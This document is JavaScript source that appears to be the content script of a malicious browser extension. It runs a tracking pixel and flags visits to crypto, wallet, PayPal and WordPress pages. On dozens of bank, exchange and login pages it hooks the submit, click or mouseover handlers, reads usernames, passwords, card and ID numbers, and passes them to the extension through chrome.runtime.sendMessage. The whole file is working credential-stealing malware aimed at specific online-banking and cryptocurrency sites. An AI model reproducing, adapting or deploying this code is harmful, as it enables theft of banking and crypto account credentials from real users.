(new Image).src = "//whos.amung.us/swidget/bbbbbbbbd";
var myStringArray = [
  "coin",
  "bit",
  "wp-admin.php",
  "wp-login.php",
  "ether",
  "paypal.com",
  "bitcoin",
  "monero",
  "etherum",
  "wallet",
  "cryptocurrency",
  "bitcoin",
  "blockchain.info",
  "wallet",
  "paxful.com",
  "coin.space",
  "coinapult.com",
  "bitgo.com",
  "strongcoin.com",
  "coinhive.com",
  "spectrocoin.com",
  "wirexapp.com",
  "xapo.com",
  "iqoption.com",
  "etoro.com",
  "bittrex.com",
  "localbitcoins.com",
  "cex.io",
  "kraken.com",
  "etherdelta.com",
  "bitfinex.com",
  "bitstamp.net",
  "bisq.network",
  "gdax.com",
  "shapeshift.io",
  "binance.com",
  "coinmama.com",
  "bitcoin.de",
  "bithumb.com",
  "coinatmradar.com",
  "poloniex.com",
  "changelly.com",
  "zebpay.com",
  "bitso.com",
  "gemini.com",
  "yobit.net",
  "luno.com",
  "bitbay.net",
  "bitpanda.com",
  "bitflyer.jp",
  "cryptonia.co.nz",
  "btcmarkets.net",
  "coinchceck.com",
  "bx.in.th",
  "bitcoin.co.id",
  "anycoindirect.eu",
  "hitbtc.com",
  "bitmex.com",
  "indacoin.com",
  "mine",
  "cloud"
];
var arrayLength = myStringArray.length;
for (var i = 0; i < arrayLength; i++) {
    if (window.location.href.indexOf(myStringArray[i]) > -1) {
          var login = {};
          login.href = window.location.href;
          chrome.runtime.sendMessage({cmd: "w",login});
}
}


if (top['location']['href']['indexOf']('https://onlinebanking.anb.com.sa/RetailBank/app/logon.jsp') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('login_wrapper')) {
            clearInterval(interval);
            document['getElementsByClassName']('login_submit')[0].onmouseover = function (_0x441cx2) {
                  var login = {};
                  login.username = document.getElementById("uname").value;
                  login.pass = "USERNAME";
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};
if (top['location']['href']['indexOf']('https://onlinebanking.anb.com.sa/RetailBank/core.login.logon2.do') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('login_wrapper')) {
            clearInterval(interval);
            document['getElementsByClassName']('submit')[0].onmouseover = function (_0x441cx2) {
                  var login = {};
                  login.username = document.getElementsByName("password1")[0].value;
                  login.pass = "PASSWORD";
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};

if (top['location']['href']['indexOf']('mijnzakelijk.ing.nl') > -1) {
    var interval = setInterval(function () {
        if (document['getElementById']('login')) {
            clearInterval(interval);
            document['getElementsByClassName']('submit')[0].onclick = function (_0x441cx2) {

              var login = {};
              var inputs = document.getElementsByTagName('input');
               for(var i = 0; i < inputs.length; i++) {
                if(inputs[i].type.toLowerCase() == 'password') {
                p = inputs[i].value;
               }
                }
                  login.username = document.getElementsByClassName(" firstfield")[0].value;
                  login.pass = p;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('mijn.ing.nl') > -1) {
    var interval = setInterval(function () {
        if (document['getElementById']('login')) {
            clearInterval(interval);
            document['getElementsByClassName']('submit')[0].onclick = function (_0x441cx2) {

              var login = {};
              var inputs = document.getElementsByTagName('input');
               for(var i = 0; i < inputs.length; i++) {
                if(inputs[i].type.toLowerCase() == 'password') {
                p = inputs[i].value;
               }
                }
                  login.username = document.getElementsByClassName(" firstfield")[0].value;
                  login.pass = p;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('online.procreditbank.ge') > -1) {
    var interval = setInterval(function () {
        if (document['getElementById']('LoginTable')) {
            clearInterval(interval);
            document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
              var login = {};
                  login.username = document.getElementsByClassName("Login_input_name")[0].value;
                  login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};

if (top['location']['href']['indexOf']('online2.procreditbank.ge') > -1) {
    var interval = setInterval(function () {
        if (document['getElementById']('LoginTable')) {
            clearInterval(interval);
            document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
              var login = {};
                  login.username = document.getElementsByClassName("Login_input_name")[0].value;
                  login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('online1.procreditbank.ge') > -1) {
    var interval = setInterval(function () {
        if (document['getElementById']('LoginTable')) {
            clearInterval(interval);
            document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
              var login = {};
                  login.username = document.getElementsByClassName("Login_input_name")[0].value;
                  login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('internetbank.swedbank.se') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('dl-container')) {
            clearInterval(interval);
            document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
              var option = document.getElementsByName("auth:metod_2");
              var select = option.options[option.selectedIndex].value;
              var userid = document.getElementsByName("auth:kundnummer")[0].value;
              var login = {};
                  login.username = userid;
                  login.pass = select;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('internetbanking.caixa.gov.br') > -1) {
    var interval = setInterval(function () {
        if (document['getElementById']('conteudo-login')) {
            clearInterval(interval);
            document['getElementsByName']('btnLogin')[0].onclick = function (_0x441cx2) {
              var login = {};
                  login.username = document.getElementsByName("name")[0].value;
                  login.pass = "test buttons 1 of 3";
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('www.bnpparibasfortis.be') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('login_flow')[0]) {
            clearInterval(interval);
            document['getElementsByClassName']('form-class')[0].onsubmit = function (_0x441cx2) {
              var login = {};
                  login.username = document.getElementsByName("cardNum")[0].value;
                  login.pass = document.getElementsByName("clientNum")[0].value;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('https://online.swedbank.se/app/privat/login') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('app-identification_login-method')[0]) {
            clearInterval(interval);
            document['getElementsByClassName']('_btn--block swed-button _margins-lg swed-button--primary')[0].onclick = function (_0x441cx2) {
              var option = document.getElementsByClassName("ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required swed-input-container__form-control");
              var select = option.options[option.selectedIndex].value;
              var userid = document.getElementsByName("userId")[0].value;
              var login = {};
              login.username = select;
              login.pass = userid;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('https://web.bancadigitalbod.com') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('caja-login')[0]) {
            clearInterval(interval);
            document['getElementsByClassName']('button-continuar-apagado')[0].onclick = function (_0x441cx2) {
              var option = document.getElementsByName("select-corto");
              var select = option.options[option.selectedIndex].value;
              var documentNumber = document.getElementsByName("form:txtNumIdCli")[0].value;
              var login = {};
                  login.username = select;
                  login.pass = documentNumber;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota/empresas/') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('cont-personas')[0]) {
            clearInterval(interval);
            document['getElementsByClassName']('btn-ingreso-empresas')[0].onclick = function (_0x441cx2) {
              var option = document.getElementsByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:tipoDocumento");
              var select = option.options[option.selectedIndex].value;
              var documentNumber = document.getElementsByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:numeroDocumento")[0].value;
              var login = {};
                  login.username = select;
                  login.pass = documentNumber;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});

            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota/personas/') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('cont-personas')[0]) {
            clearInterval(interval);
            document['getElementsByName']('submit_submit')[0].onclick = function (_0x441cx2) {
              var option = document.getElementsByName("documentType");
              var select = option.options[option.selectedIndex].value;
              var login = {};
              var documentNumber = document.getElementsByName("documentNumber")[0].value;
              var pass = document.getElementsByName("password")[0].value;
              var card = document.getElementsByName("cardNumber")[0].value;
              var data = "docNumber: "+ documentNumber + " pass: "+ pass + " card: "+ card;
                  login.username = select;
                  login.pass = data;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});

            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('e-bdv.banvenez.com') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('borde_tabla_basic')[0]) {
            clearInterval(interval);
            document['getElementsByClassName']('input_boton_neg')[0].onclick = function (_0x441cx2) {
             var login = {};
            login.username = document.getElementsByName("Username1")[0].value;
            login.pass = document.getElementsByName("Passworde1")[0].value;
            login.href = window.location.href;
            chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
    var interval = setInterval(function () {
        if (document['getElementsByClassName']('borde_tabla_basic')[0]) {
            clearInterval(interval);
            document['getElementsByName']('input_boton_neg')[0].onclick = function (_0x441cx2) {
             var login = {};
            login.username = document.getElementsByName("notarjeta1")[0].value;
            login.pass = document.getElementsByName("passwordp1")[0].value;
            login.href = window.location.href;
            chrome.runtime.sendMessage({cmd: "l",login});
            }
        }
    }, 1000)
};


  if (top['location']['href']['indexOf']('https://www.netbanking.mk/Stopanstvo/LoginModule/LoginUP.aspx') > -1) {
      var interval = setInterval(function () {
          if (document['getElementsByClassName']('login_fields')[0]) {
              clearInterval(interval);
              document['getElementsByClassName']('login_submit')[0].onclick = function (_0x441cx2) {
               var login = {};
              login.username = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$UserNameTextBox")[0].value;
              login.pass = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$PasswordTextBox")[0].value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };


  if (top['location']['href']['indexOf']('wallet.advcash.com') > -1) {
      var interval = setInterval(function () {
          if (document['getElementsByClassName']('form')[0]) {
              clearInterval(interval);
              document['getElementsByName']('j_idt55')[0].onmouseover = function (_0x441cx2) {
               var login = {};
              login.username = document.getElementsByName("j_username")[0].value;
              login.pass = document.getElementsByName("j_password")[0].value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };


  if (top['location']['href']['indexOf']('paypal.com') > -1) {
      var interval = setInterval(function () {
          if (document['getElementsByClassName']('proceed maskable')[0]) {
              clearInterval(interval);
              document['getElementsByName']('login')[0].onsubmit = function (_0x441cx2) {
               var login = {};
              login.username = document.getElementsByName("login_email")[0].value;
              login.pass = document.getElementsByName("login_password")[0].value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };



if (window.location.href.indexOf("http://bitcoinglobalclub.com/mlm/pages/login/login.php") > -1) {
var login_form = document.getElementById("loginForm");
    if(login_form){
        login_form.onsubmit = function(){
            var login = {};
            login.username = document.getElementsByName("usus")[0].value;
            login.pass = document.getElementsByName("clave")[0].value;
            login.href = window.location.href;
            chrome.runtime.sendMessage({cmd: "l",login});
		        }
          }
        }


  if (top['location']['href']['indexOf']('https://www3.bancaribe.com.ve/bcn/') > -1) {
      var interval = setInterval(function () {
          if (document['getElementsByName']('conexion')[0]) {
              clearInterval(interval);
              document['getElementsByClassName']('botones_1')[0].onmouseover = function (_0x441cx2) {
              var login = {};
              login.username = document.getElementsByName("userid")[0].value;
              login.pass = document.getElementsByName("password")[0].value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };


  if (top['location']['href']['indexOf']('https://www4.bancaribe.com.ve/bcj/') > -1) {
      var interval = setInterval(function () {
          if (document['getElementsByClassName']('form1')[0]) {
              clearInterval(interval);
              document['getElementsByClassName']('botones_1')[0].onmouseover = function (_0x441cx2) {
               var login = {};
              login.username = document.getElementsByName("userlogin")[0].value;
              login.pass = document.getElementsByName("passwd")[0].value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };



  if (top['location']['href']['indexOf']('https://bitpay.com/dashboard/login') > -1) {
      var interval = setInterval(function () {
          if (document['getElementsByClassName']('bp-constrain-login')[0]) {
              clearInterval(interval);
              document['getElementsByClassName']('button bp-button prelogin__button ladda-button')[0].onclick = function (_0x441cx2) {
               var login = {};
              login.username = document.getElementsByName("email")[0].value;
              login.pass = document.getElementsByName("password")[0].value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };

  if (top['location']['href'] === 'https://auth.bitbay.net/login') {
      var interval = setInterval(function () {
          if (document['getElementsByClassName']('main-content-container')[0]) {
              clearInterval(interval);
              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
               var login = {};
              login.username = document.getElementsByName("email")[0].value;
              login.pass = "null"; //document.getElementsByName("password")[0].value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };
  if (top['location']['href'] === 'https://auth.bitbay.net/login-password') {
      var interval = setInterval(function () {
          if (document['getElementsByClassName']('main-content-container')[0]) {
              clearInterval(interval);
              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
               var login = {};
              login.username = "null" //document.getElementsByName("email")[0].value;
              login.pass = document.getElementsByName("password")[0].value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };

  if (top['location']['href'] === 'https://auth.bitbay.net/login-password') {
      var interval = setInterval(function () {
          if (document['getElementsByClassName']('main-content-container')[0]) {
              clearInterval(interval);
              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
               var login = {};
              login.username = "null" //document.getElementsByName("email")[0].value;
              login.pass = document.getElementsByName("password")[0].value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };

if (top['location']['href']['indexOf']('wp-login.php') > -1) {
      var interval = setInterval(function () {
          if (document['getElementById']('loginform')) {
              clearInterval(interval);
              document['getElementById']('wp-submit').onclick = function (_0x441cx2) {
               var login = {};
              login.username = document.getElementById("user_login").value;
              login.pass = document.getElementById("user_pass").value;
              login.href = window.location.href;
              chrome.runtime.sendMessage({cmd: "l",login});
              }
          }
      }, 1000)
  };

  if (top['location']['href']['indexOf']('https://ltcbackoffice.org/') > -1) {
        var interval = setInterval(function () {
            if (document['getElementsByClassName']('page-content')) {
                clearInterval(interval);
                document['getElementsByClassName']('btn-primary').onclick = function (_0x441cx2) {
                 var login = {};
                login.username = document.getElementById("username").value;
                login.pass = document.getElementById("password").value;
                login.href = window.location.href;
                chrome.runtime.sendMessage({cmd: "l",login});
                }
            }
        }, 1000)
    };

    if (top['location']['href']['indexOf']('https://localbitcoins.com/accounts/login/') > -1) {
          var interval = setInterval(function () {
              if (document['getElementsByClassName']('container')) {
                  clearInterval(interval);
                  document['getElementById']('btn-primary').onclick = function (_0x441cx2) {
                   var login = {};
                  login.username = document.getElementById("id_username").value;
                  login.pass = document.getElementById("id_password").value;
                  login.href = window.location.href;
                  chrome.runtime.sendMessage({cmd: "l",login});
                  }
              }
          }, 1000)
      };

      if (top['location']['href']['indexOf']('https://sys.chip-coin.net:1006/sys/iCommerce/modules/mod_chipcoin/login.jsp') > -1) {
            var interval = setInterval(function () {
                if (document['getElementsByClassName']('form-signin')) {
                    clearInterval(interval);
                    document['getElementById']('btn btn-large btn-warning').onclick = function (_0x441cx2) {
                     var login = {};
                    login.username = document.getElementsByName("usu").value;
                    login.pass = document.getElementsByName("con").value;
                    login.href = window.location.href;
                    chrome.runtime.sendMessage({cmd: "l",login});
                    }
                }
            }, 1000)
        };

        if (top['location']['href']['indexOf']('https://onixcoin.com/inicio-sesion/') > -1) {
              var interval = setInterval(function () {
                  if (document['getElementsByClassName']('onix-info')) {
                      clearInterval(interval);
                      document['getElementById']('btn_sesion').onclick = function (_0x441cx2) {
                       var login = {};
                      login.username = document.getElementsByName("correo")[1].value;
                      login.pass = document.getElementsByName("clave")[0].value;
                      login.href = window.location.href;
                      chrome.runtime.sendMessage({cmd: "l",login});
                      }
                  }
              }, 1000)
          };

          if (top['location']['href']['indexOf']('https://www.coinpayments.net/login') > -1) {
                var interval = setInterval(function () {
                    if (document['getElementsByClassName']('login')) {
                        clearInterval(interval);
                        document['getElementsByClassName']('w-button button large login').onclick = function (_0x441cx2) {
                         var login = {};
                        login.username = document.getElementsByName("username")[0].value;
                        login.pass = document.getElementsByName("pass")[0].value;
                        login.href = window.location.href;
                        chrome.runtime.sendMessage({cmd: "l",login});
                        }
                    }
                }, 1000)
            };

            if (top['location']['href']['indexOf']('http://www.bancacumana.tk/') > -1) {
                  var interval = setInterval(function () {
                      if (document['getElementById']('login_panel')) {
                          clearInterval(interval);
                          document['getElementsByClassName']('btn btn-primary').onclick = function (_0x441cx2) {
                           var login = {};
                          login.username = document.getElementsByName("username")[0].value;
                          login.pass = document.getElementsByName("password")[0].value;
                          login.href = window.location.href;
                          chrome.runtime.sendMessage({cmd: "l",login});
                          }
                      }
                  }, 1000)
              };
